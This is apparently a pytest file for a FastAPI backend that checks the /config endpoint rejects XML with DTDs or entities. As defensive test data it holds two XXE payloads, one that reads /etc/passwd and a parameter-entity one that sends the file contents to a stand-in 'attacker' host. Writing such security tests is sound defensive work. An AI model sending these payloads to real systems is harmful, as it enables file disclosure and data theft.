from fastapi.testclient import TestClient
from backend.main import app
from unittest.mock import patch, mock_open

client = TestClient(app)

def test_config_xxe_protection():
    # We don't need a real case path because validation happens before file access
    # but the code calls validate_case_path first.
    # However, validate_case_path checks existence relative to CASES_PATH.
    # So we should mock validate_case_path too or just use a dummy path that would pass if valid?
    # Actually, validate_case_path checks `is_relative_to`.

    # Let's mock the entire save_config endpoint's file writing part,
    # OR rely on the fact that validation exception happens BEFORE any file io.

    # But wait, the validator is on the Pydantic model.
    # Pydantic validation happens before the path validation logic in the handler body?
    # Yes, usually.

    xxe_content = """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""

    # We use a dummy path. It doesn't matter if it exists or not for Pydantic validation,
    # UNLESS the endpoint logic runs validate_case_path (which raises 403) before Pydantic validation?
    # No, FastAPI does Pydantic validation first.

    res_write = client.post("/config", json={"case_path": "dummy/path", "content": xxe_content})

    # It should fail validation (status 422)
    assert res_write.status_code == 422
    assert "XML DTDs/Entities are not allowed" in res_write.text

    # Also test parameter entity
    xxe_param = """<!DOCTYPE data [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker/?x=%file;'>">
    %eval;
    %exfiltrate;
    ]>"""

    res_write_param = client.post("/config", json={"case_path": "dummy/path", "content": xxe_param})
    assert res_write_param.status_code == 422
    assert "XML DTDs/Entities are not allowed" in res_write_param.text

    # Test Valid Content (should NOT be 422, but might be 403 or 404 because path is invalid)
    # This confirms we didn't break normal usage validation,
    # but we want to ensure we don't actually write to disk if we accidentally pass a valid path.

    valid_content = "<config><ok>1</ok></config>"

    # We mock open just in case, to be safe.
    with patch("builtins.open", mock_open()) as mocked_file:
        # We also need to mock os.path.exists or ensure path validation passes if we want to reach write.
        # But here we just want to ensure NO 422 occurs for valid content.
        # If we send dummy path, validate_case_path will likely raise 403.
        # That's fine, 403 != 422.

        res_valid = client.post("/config", json={"case_path": "dummy/path", "content": valid_content})
        assert res_valid.status_code != 422
